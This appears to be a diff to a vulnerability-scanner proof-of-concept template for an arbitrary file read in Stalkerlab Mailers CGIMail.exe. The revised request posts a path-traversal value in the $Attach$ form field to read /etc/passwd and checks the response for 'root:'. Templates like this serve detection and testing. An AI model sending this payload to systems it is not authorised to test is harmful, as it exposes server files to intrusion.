@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "检测 Stalkerlab Mailers 1.1.2 中 CGIMail.exe 是否存在任意文件读取漏洞。通过向 /cgimail.exe 发送包含 $Attach$ 参数的 POST 请求，尝试读取服务器上的 /etc/passwd 文件，验证是否存在任意文件读取漏洞。"
-id = "POC-AVE-2000-0878"
-name = "Stalkerlab Mailers CGIMail.exe 任意文件读取漏洞 PoC"
+description = "验证 Stalkerlab Mailers 1.1.2 CGIMail.exe CGI 程序的 $Attach$ 隐藏表单变量任意文件读取漏洞"
+id = "POC-AVE-2000-00878"
+name = "CVE-2000-0726 PoC"
 severity = "low"
 tags = ["ave-2000-0878"]
 vuln_id = [
@@ -11,26 +11,18 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgimail.exe"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgimail.exe"
+path = "/cgi-bin/CGIMail.exe"
 protocol = "http"
 
 [poc.requests.body]
-content = "$Attach$=/etc/passwd"
-type = "raw"
+type = "form"
+
+[poc.requests.body.content]
+"$Attach$" = "../../../../etc/passwd"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
@@ -39,8 +31,9 @@ Content-Type = "application/x-www-form-urlencoded"
 expect = true
 part = "body"
 type = "word"
-words = [
-    "root:",
-    "bin:",
-    "daemon:",
-]
+words = ["root:"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
